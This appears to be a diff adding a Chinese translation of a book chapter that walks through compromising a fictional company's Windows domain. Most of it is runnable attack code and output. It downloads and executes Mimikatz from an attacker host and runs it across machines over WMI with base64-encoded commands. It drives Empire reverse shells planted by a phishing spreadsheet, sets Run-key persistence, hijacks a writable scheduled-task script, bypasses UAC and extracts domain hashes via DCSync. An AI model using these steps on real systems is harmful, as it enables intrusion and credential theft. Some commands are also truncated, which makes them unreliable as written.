@@ -169,3 +169,292 @@ invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Ap
 
 
 深度分析
+
+使用invoke-mimikatz特性在多台机器上执行代码实际上并不可靠。如果管理员没有正确配置PowerShell remoting，则使其工作可能有点棘手。解决此类问题的一种方法是使用WMI，这是在服务器上执行远程命令的另一个有趣的工具。
+
+我们的想法是创建一个行的PowerShell命令执行Mimikatz和转储内容到本地文件。 我们使用WMI远程启动此代码，等待几秒钟，然后在我们的计算机上检索文件。
+
+接下来我们一步一步地分析：
+1. 我们稍微更改以前的代码，将目标的 IP 地址包含在输出的文件名中:
+```#bash
+$browser = New-Object System.Net.WebClient
+
+IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
+
+```
+2. 我们将每个换行符更改为“;”，然后将此脚本放入PowerShell脚本的变量中：
+```#bash
+PS > $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
+```
+3. 我们对这个变量进行base64编码，并定义要定位的机器：
+```#bash
+PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+PS> $encodedCommand = [Convert]::ToBase64String($bytes)
+PS> $PC_IP = @("10.10.20.229", "10.10.20.97")
+```
+4. 然后我们准备循环执行WMI，生成PowerShell，将前面的base64代码作为参数传递：
+```
+PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
+```
+5. 最后，我们把导出的文件移到我们目标机10.10.20.118：
+```
+PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
+```
+6. 下面包含完整的脚本和一个小的附加代码片段，该附加代码段将等到远程进程完成后才检索结果:
+```#bash
+$command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+$PC_IP = @("10.10.20.229", "10.10.20.97")
+
+
+ForEach ($X in $PC_IP) {
+ 
+$proc = invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
+$proc_id = $proc.processId
+
+do {(Write-Host "[*] Waiting for mimi to finish on $X"), (Start-Sleep -Seconds 2)}
+until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where
+{$_.ProcessId -eq $proc_id}).ProcessID -eq $null) move-item -path "\\$X\C$\windows\temp\$X.txt" -
+Destination C:\users\Administrator\desktop\ -force
+write-host "[+] Got file for $X" -foregroundcolor "green"
+}
+
+```
+
+## 4.4 遗漏的环节
+
+还记得我们的网络钓鱼活动吗？当我们忙于同时购买机器和域时，员工们欣喜地打开我们的Excel文件。
+
+尽管我们现在控制着SPH网络上的所有资源，但让我们看看如何通过用户工作站来达到相同的结果。
+
+注意：我们切换回Empire框架，在该框架中，Front Gun服务器正在监听等待来自Excel恶意软件的传入连接。
+
+我们与随机目标互动，并列出有关环境的基本信息：
+```#bash
+(Empire) > interact D1GAMGTVCUM2FWZC (Empire: D1GAMGTVCUM2FWZC) > sysinfo
+Listener:	http://<front-gun>:80 Internal IP:		10.10.20.54
+Hostname:	FRPC054
+OS:	Microsoft Windows 10 Pro High Integrity:	0
+Process Name:		powershell Process ID:	3404
+PSVersion:	5
+(Empire: D1GAMGTVCUM2FWZC) > rename mike (Empire: mike) >
+```
+
+反向shell由后台运行的PowerShell进程托管。即使用户关闭了Excel文档，我们仍然保留对其计算机的访问权限。当然，简单的重启会杀死我们的代理。因此，在继续之前，我们需要采取一些预防措施。
+
+在每次新登录时，Windows都会查找一些注册表项，并盲目执行许多程序。我们将使用这些注册表项之一来存储PowerShell脚本，该脚本将在Mike每次重新启动计算机时重新连接。
+`(Empire:mike)> usemodule persistence/userland/registry`
+`(Empire : persistence/userland/registry) > set Listener test`
+
+这个特定的模块使用RUN键来实现持久性（HKCU \ Software \ Microsoft \ Windows \ CurrentVersion \ Ru是无数恶意软件使用的已知方法）。这远不是我们所能想出的最隐秘的方法，但鉴于我们在工作站上的特权有限，我们暂时无法真正负担得起一些性感。
+
+提示：只需更改模块中的目标“设置代理XXXXX”，即可在所有其他代理上盲目执行此模块。
+
+现在，我们已经涵盖了这一点，我们希望定位的用户更有可能在域上具有某些管理特权，或者至少具有对某些服务器的访问权。一个明显的目标是IT支持部门。我们要求Active Directory列出在该部门注册的员工：
+```
+(Empire: mike) > usemodule situational_awareness/network/powerview/get_user (Empire: mike)  > set filter department=IT* (Empire: mike) > run
+Job started: Debug32_45g1z
+
+company	: SPH
+department	: IT support
+displayname	: Holly 
+title : intern IT
+lastlogon : 12/31/2016 9:05:47 AM 
+[...]
+company	: SPH
+department	: IT support
+displayname	: John P 
+title : IT manager
+lastlogon : 12/31/2016 8:05:47 AM 
+[...]
+```
+
+我们根据单击恶意文件的人员列表对结果进行交叉检查；亲爱的约翰脱颖而出[70]:
+```
+(Empire:) > interact H3PBLVYYS3SYNBMA
+(Empire H3PBLVYYS3SYNBMA :) > rename john
+(Empire: john) > shell net localgroup administrators Alias name	administrators
+Members
+
+------------------------------------------------------
+adm_wkt Administrator
+```
+
+尽管 John 是 IT 经理，但他的工作站上没有管理员权限。很好，有些挑战！
+
+从这里可以采取多种途径：查找漏洞，配置错误的服务，文件或注册表项中的密码等。
+
+在撰写本书时，非常流行的一种利用是利用MS016-32 [71]漏洞。触发代码是用PowerShell编写的，非常适合我们当前的情况。但是，我们并不总是拥有进行公开漏洞利用的奢侈，因此我们将走更可靠的道路。
+
+我们运行 PowerUp 模块，该模块在 Windows 上执行常规检查，以确定提升计算机特权的可行路径：
+```
+(Empire: john) > usemodule privesc/powerup/allchecks (Empire: privesc/powerup/allchecks) > run
+(Empire: privesc/powerup/allchecks) >
+Job started: Debug32_m71k0
+
+[*] Running Invoke-AllChecks
+[*] Checking if user is in a local group with administrative privileges...
+[*] Checking service permissions...
+[*] Use 'Write-ServiceEXE -ServiceName SVC' or 'Write-ServiceEXECMD' to abuse any binaries 
+[*] Checking for unattended install files...
+[*] Checking for encrypted web.config strings... 
+[…]
+```
+
+没有错误配置的服务，可劫持的DLL或纯文本密码。让我们看一下计划任务列表：
+```
+(Empire: john) > shell schtasks /query /fo LIST /v 
+(Empire: john) >
+Folder: \
+HostName:	FRPC073
+TaskName:	\Chance screensaver
+Next Run Time:		N/A 
+Status:	Ready
+Logon Mode:		Interactive/Background 
+Last Run Time:		1/15/2017 1:58:22 PM 
+Author:	SPH\adm_supreme
+Task To Run:
+C:\Apps\screensaver\launcher.bat 
+Comment:	Change screensaver 
+Scheduled Task State:		Enabled
+Run As User:	Users
+Schedule Type:	At logon time
+```
+
+有趣的是，任务计划在用户每次登录工作站时定期更新他们的屏幕保护程序。
+
+该脚本是一个简单的“launcher.bat”，位于“c:\ apps\screensaver\”中。放在这个文件夹上的访问列表呢？
+```
+(Empire: john) > shell icacls c:\apps\screensaver 
+(Empire: john) >
+c:\apps\screensaver BUILTIN\Administrators:(F) 
+    CREATOR OWNER:(OI)(CI)(IO)(F) 
+    BUILTIN\Users:(OI)(CI)(F) 
+    BUILTIN\Users:(I)(CI)(WD) 
+    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+    BUILTIN\Administrators:(I)(OI)(CI)(F) 
+Successfully processed 1 files; Failed processing 0 files
+```
+
+答对了！每个用户都可以完全控制文件夹“ C：\ Apps \ screensaver \”（“ F”权限）。我们可以通过使用自己的脚本替换“ launcher.bat”文件来劫持计划的任务。例如，一个脚本启动Mimikatz并将密码转储到本地文件（c：\ users \ john \ appdata \ local \ temp \ pass_file.txt）。
+
+我们一如既往地通过在base64中进行编码来准备代码。该步骤与之前相同，因此我不再赘述：
+```
+PS> $command = '$browser = New-Object System.Net.WebClient;$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredential
+Mimikatz.ps1"));invoke-mimikatz | out-file c:\users\john\appdata\local\temp\pass_file.txt'
+
+PS>	$bytes	= [System.Text.Encoding]::Unicode.GetBytes($command)
+PS>	$encodedCommand	= [Convert]::ToBase64String($bytes)
+PS> write-host $encodedCommand JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A
+```
+
+以下是脚本“ launcher_me.bat”，该脚本最终在John的工作站上运行：
+`Powershell.exe -NonI -W Hidden -encJABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A`
+
+我们使用Empire将其上传到目标文件夹：
+```#bash
+(Empire: john) > shell cd c:\apps\screensaver\
+(Empire: john) > upload /root/launch_me.bat
+```
+最后，我们将脚本伪装成新的launcher.bat。
+```
+(Empire: john) > shell move launcher.bat launcher_old.bat
+(Empire: john) > shell move launcher_me.bat launcher.bat
+```
+
+然后，我们等待；几个小时，也许是一两天。最终，当约翰再次登录[72]时，我们可以获取我们的文件（当然还清理了一些小混乱）：
+```
+(Empire: john2) > shell download c:\users\john\appdata\local\temp\pass_file.txt 
+(Empire: john2) > shell del launcher.bat 
+(Empire: john2) > shell move launcher_old.bat launcher.bat
+
+FrontGun$ cat pass_file.txt
+
+Hostname: FRPC073.sph.corp / -
+.#####.	mimikatz 2.1 (x64) built on Mar 31 2016
+16:45:32
+.## ^ ##. "A La Vie, A L'Amour" ## / \ ## /* * *
+##	\	/	##	Benjamin	DELPY	`gentilkiwi`	( benjamin@gentilkiwi.com )
+'## v ##'	http://blog.gentilkiwi.com/mimikatz (oe.eo)
+'#####'	with 18 modules * * */
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 11506673 (00000000:00af93f1) Session	: Interactive from 2
+User Name	: john
+Domain	: SPH
+Logon Server	: FRSV073
+Logon Time	: 16/01/2017 8:40:50 AM
+SID	: S-1-5-21-2376009117-2296651833- 4279148973-1124
+[…]
+
+kerberos :
+    *	Username : john
+    *	Domain	: SPH.CORP
+    *	Password : JP15XI$ ssp :
+    credman :
+    […]
+    
+    […] 
+kerberos :
+    * Username : adm_supreme
+    *	Domain	: SPH.CORP
+    * Password : Charvel097*
+    ssp : 
+    credman :
+    […]
+```
+
+有趣！似乎已执行此计划任务，并具有adm_supreme的特权：
+![xxx示意图](./Chap4/4.4-2.jpg)
+
+我们使用这些新获得的凭据在工作站上产生一个新的管理会话。
+```
+(Empire:) > usemodule management/spawnas
+(Empire:	management/spawnas)	>	set	UserName adm_supreme
+(Empire: management/spawnas) > set Domain SPH (Empire:	management/spawnas)	>	set	Password Charvel097*
+(Empire: management/spawnas) > set Agent john (Empire: management/spawnas) > run
+Launcher bat written to C:\Users\Public\debug.bat
+
+
+Handles NPM(K)	PM(K)	WWS(K) VM(M)	CPU(s)
+Id SI ProcessName
+------- ------	-----	----- -----	------	--	--  --
+6 4	1380 236 ...63	0.00	5404 2 cmd
+```
+![xxx示意图](./Chap4/4.4-3.jpg)
+
+新的adm_supreme会话实际上在工作站上具有受限的特权（UAC再次发出警报）。如果我们需要执行提升操作，例如设置更好的持久性方法，监视John等，我们需要使用更高的特权上下文，从而绕过UAC：
+```
+(Empire: admSupreme) > usemodule privesc/bypassuac_eventvwr
+(Empire: privesc/bypassuac_eventvwr) > set Listener test
+(Empire: privesc/bypassuac_eventvwr) > run
+Job started: Debug32_23tc3	
+```
+![xxx示意图](./Chap4/4.4-4.jpg)
+
+在我们亲爱的adm_supreme的用户名前面的小星星意味着它是一个提升的会话。我们可以使用此会话在工作站上设置持久性和其他漂亮的东西。
+
+## 4.5 更多密码
+
+总而言之，我们获得了一个域管理员帐户。仅此一项就足以造成严重破坏。但是，当该特定管理员更改密码时会发生什么？考虑到我们已经拥有的访问级别，是否可以在不产生过多噪音的情况下设法转储更多密码？
+
+答案在于NTDS.DIT文件：Active Directory的数据库，其中包含配置方案，资源定义以及所有用户密码的哈希值。它在每个域控制器上存储和复制。
+
+以下是请求域管理员Hash的命令行：
+```#bash
+PS> $browser = New-Object System.Net.WebClient
+PS> IEX($browser.DownloadString("http://192.168.1.90:443/IMimikatz.ps1"))
+PS> invoke-mimikatz -Command '"lsadump::dcsync/domain:sph.corp /user:administrator"'
+```
+![xxx示意图](./Chap4/4.4-5.jpg)
+
+使用此帐号，我们将永不再受UAC的约束!我们对每个我们感兴趣的域帐户遍历此命令。我们可以通过传递Hash来冒充这些用户。
+
+提示:一种有趣的持久化技术是生成黄金票据(Kerberos票据，有效期为10年)。查看:http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos。
+
+
+
